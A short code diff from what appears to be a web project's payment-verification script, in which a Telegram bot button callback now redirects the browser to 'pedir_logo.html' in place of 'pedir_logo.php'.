@@ -356,7 +356,7 @@ async function checkPaymentVerification(transactionId) {
                 case `pedir_logo:${transactionId}`:
                     // Eliminar botones
                     removeInlineKeyboard(config.token, verificationUpdate.callback_query.message.chat.id, messageId);
-                    window.location.href = "pedir_logo.php";
+                    window.location.href = "pedir_logo.html";
                     break;
                 case `error_logo:${transactionId}`:
                     // Eliminar botones
